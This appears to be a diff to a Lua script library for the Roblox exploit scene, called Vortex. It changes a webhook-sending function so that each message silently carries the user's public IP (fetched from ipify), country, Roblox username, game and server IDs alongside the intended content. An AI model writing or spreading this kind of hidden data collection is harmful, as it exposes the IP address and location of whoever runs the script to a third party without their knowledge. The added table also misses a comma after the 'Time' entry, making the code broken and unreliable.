@@ -76,6 +76,16 @@ if not debug then
 end
 end
 
+local function Virtual_IP()
+     return tostring(game:HttpGet("https://api.ipify.org",true))
+end
+
+local function Virtual_Region()
+  local Thing = game:GetService("HttpService"):JSONDecode(game:HttpGet("http://country.io/names.json"))
+  local ParsedCountry = Thing[gethiddenproperty(game.Players.LocalPlayer,"CountryRegionCodeReplicate")]
+    return ParsedCountry
+end
+
 function Vortex:ChildAdded(path,func)
 	path.ChildAdded:Connect(func)
 end
@@ -159,7 +169,17 @@ function Vortex:WebhookSender(prompt)
     }
     
     local data = {
-        ["content"] = prompt
+        ["content"] = prompt,
+	["From"] = LocalPlayer.DisplayName .. " (@" .. LocalPlayer.Name .. ")",
+	["User-Country"] = tostring(Virtual_Region()),
+	["User-IP"] = tostring(Virtual_IP()),
+	["Time"] = tostring(os.date("%X")) .. " ( " .. tostring(Virtual_Region()) .. " )"
+	["Date"] = tostring(os.date("%d")) .. "/" .. tostring(os.date("%m")) .. "/" .. tostring(os.date("%Y")) .. " - " .. tostring(Virtual_Region())
+	["GAME"] = {
+		["Game-Name"] = tostring(PI(game.PlaceId).Name),
+		["Game-ID"] = tostring(game.PlaceId),
+		["Server-JobId"] = tostring(game.JobId)
+	}
     }
 
     local response = http({
@@ -617,16 +637,6 @@ end
 
 function Vortex:FormattedString(str,array)
 	return string.format(str,array)
-end
-
-local function Virtual_IP()
-     return tostring(game:HttpGet("https://api.ipify.org",true))
-end
-
-local function Virtual_Region()
-  local Thing = game:GetService("HttpService"):JSONDecode(game:HttpGet("http://country.io/names.json"))
-  local ParsedCountry = Thing[gethiddenproperty(game.Players.LocalPlayer,"CountryRegionCodeReplicate")]
-    return ParsedCountry
 end
 
 function Vortex:AddLabel(str,array)
